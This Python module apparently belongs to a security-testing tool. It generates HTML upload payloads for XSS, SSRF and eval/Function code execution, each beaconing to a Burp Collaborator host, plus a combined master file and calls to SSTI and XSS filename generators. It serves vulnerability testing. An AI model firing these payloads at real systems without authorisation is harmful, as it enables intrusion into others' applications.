from pathlib import Path

try:
    from .ssti_filename_generator import generate_ssti_filename_payloads
    from .xss_filename_generator import generate_xss_filename_payloads
except ImportError:
    try:
        from ssti_filename_generator import generate_ssti_filename_payloads
        from xss_filename_generator import generate_xss_filename_payloads
    except ImportError:
        generate_ssti_filename_payloads = None
        generate_xss_filename_payloads = None

def generate_html_payloads(output_dir, burp_collab, tech_filter='all', payload_types=None):
    if payload_types is None:
        payload_types = {'all'}
    
    def should_generate_type(payload_type):
        return 'all' in payload_types or payload_type in payload_types
    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
    base_url = f"http://{burp_collab}"
    
    if should_generate_type('xss'):
        xss_dir = output_dir / 'xss'
        xss_dir.mkdir(exist_ok=True)
    if should_generate_type('ssrf'):
        ssrf_dir = output_dir / 'ssrf'
        ssrf_dir.mkdir(exist_ok=True)
    if should_generate_type('rce') or should_generate_type('deserialization'):
        rce_dir = output_dir / 'rce'
        rce_dir.mkdir(exist_ok=True)
    
    html_xss1_script = f'''<!DOCTYPE html>
<html>
<head>
<title>Test</title>
</head>
<body>
<script>fetch('{base_url}/xss-html-script')</script>
</body>
</html>'''
    if should_generate_type('xss'):
        with open(xss_dir / "xss1_script.html", 'w', encoding='utf-8') as f:
            f.write(html_xss1_script)
    
    html_xss2_img = f'''<!DOCTYPE html>
<html>
<head>
<title>Test</title>
</head>
<body>
<img src=x onerror=fetch('{base_url}/xss-html-img')>
</body>
</html>'''
    if should_generate_type('xss'):
        with open(xss_dir / "xss2_img.html", 'w', encoding='utf-8') as f:
            f.write(html_xss2_img)
    
    html_xss3_svg = f'''<!DOCTYPE html>
<html>
<head>
<title>Test</title>
</head>
<body>
<svg onload=fetch('{base_url}/xss-html-svg')>
</body>
</html>'''
    if should_generate_type('xss'):
        with open(xss_dir / "xss3_svg.html", 'w', encoding='utf-8') as f:
            f.write(html_xss3_svg)
    
    html_ssrf1_img = f'''<!DOCTYPE html>
<html>
<head>
<title>Test</title>
</head>
<body>
<img src='{base_url}/ssrf-html-img'>
</body>
</html>'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf1_img.html", 'w', encoding='utf-8') as f:
            f.write(html_ssrf1_img)
    
    html_ssrf2_link = f'''<!DOCTYPE html>
<html>
<head>
<title>Test</title>
<link rel='stylesheet' href='{base_url}/ssrf-html-link'>
</head>
<body>
</body>
</html>'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf2_link.html", 'w', encoding='utf-8') as f:
            f.write(html_ssrf2_link)
    
    html_ssrf3_script = f'''<!DOCTYPE html>
<html>
<head>
<title>Test</title>
<script src='{base_url}/ssrf-html-script'></script>
</head>
<body>
</body>
</html>'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf3_script.html", 'w', encoding='utf-8') as f:
            f.write(html_ssrf3_script)
    
    html_ssrf4_iframe = f'''<!DOCTYPE html>
<html>
<head>
<title>Test</title>
</head>
<body>
<iframe src='{base_url}/ssrf-html-iframe'></iframe>
</body>
</html>'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf4_iframe.html", 'w', encoding='utf-8') as f:
            f.write(html_ssrf4_iframe)
    
    html_rce1_eval = f'''<!DOCTYPE html>
<html>
<head>
<title>Test</title>
</head>
<body>
<script>eval('fetch(\\'{base_url}/rce-html-eval\\')')</script>
</body>
</html>'''
    if should_generate_type('rce'):
        with open(rce_dir / "rce1_eval.html", 'w', encoding='utf-8') as f:
            f.write(html_rce1_eval)
    
    html_rce2_function = f'''<!DOCTYPE html>
<html>
<head>
<title>Test</title>
</head>
<body>
<script>Function('fetch(\\'{base_url}/rce-html-function\\')')()</script>
</body>
</html>'''
    if should_generate_type('rce'):
        with open(rce_dir / "rce2_function.html", 'w', encoding='utf-8') as f:
            f.write(html_rce2_function)
    
    master_html = f'''<!DOCTYPE html>
<html>
<head>
<title>Test</title>
<script src='{base_url}/ssrf-html-script'></script>
</head>
<body>
<script>fetch('{base_url}/xss-html-script')</script>
<img src='{base_url}/ssrf-html-img'>
<iframe src='{base_url}/ssrf-html-iframe'></iframe>
<script>eval('fetch(\\'{base_url}/rce-html-eval\\')')</script>
</body>
</html>'''
    with open(output_dir / "master.html", 'w', encoding='utf-8') as f:
        f.write(master_html)
    
    if generate_ssti_filename_payloads and should_generate_type('ssti'):
        generate_ssti_filename_payloads(output_dir, 'html', burp_collab, tech_filter)
    
    if generate_xss_filename_payloads and should_generate_type('xss'):
        generate_xss_filename_payloads(output_dir, 'html', burp_collab, tech_filter)
